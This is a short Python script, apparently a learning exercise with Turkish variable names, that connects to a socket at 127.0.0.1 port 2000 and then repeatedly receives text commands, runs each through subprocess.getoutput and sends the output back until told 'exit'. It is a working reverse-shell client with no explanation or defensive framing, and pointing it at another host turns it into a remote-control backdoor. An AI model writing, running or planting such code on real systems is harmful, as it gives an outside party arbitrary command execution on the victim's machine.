import socket
import subprocess

host = "127.0.0.1"
port = 2000
soket = socket.socket()
soket.connect((host, port))
mesaj = soket.recv(1024).decode()
print(mesaj)

while True:
    komut = soket.recv(1024).decode()
    if komut.lower() == "exit":
        break
    cikti = subprocess.getoutput(komut)
    soket.send(cikti.encode())
soket.close()
